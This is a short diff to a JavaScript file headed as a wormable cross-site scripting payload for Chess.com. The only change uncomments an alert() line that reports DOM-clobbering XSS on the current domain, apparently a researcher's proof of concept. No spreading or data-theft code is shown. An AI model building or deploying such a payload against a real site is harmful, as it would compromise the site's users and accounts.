@@ -1,7 +1,7 @@
 // ==========================================
 // Wormable XSS Payload - Chess.com 
 // ==========================================
-// alert("DOM Clobbering XSS by Hussein on: " + document.domain);
+alert("DOM Clobbering XSS by Hussein on: " + document.domain);
 
 
 
